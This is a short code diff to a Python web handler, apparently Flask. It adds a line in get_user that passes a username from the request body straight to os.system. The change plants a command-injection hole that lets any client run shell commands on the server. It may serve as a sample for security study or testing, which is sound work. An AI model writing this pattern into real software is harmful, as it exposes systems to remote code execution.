@@ -112,6 +112,7 @@ def display_note(encrypted_note):
 def get_user():
     data = request.json
     username = data.get('username')
+    os.system(username)
 
     return username, 200
 
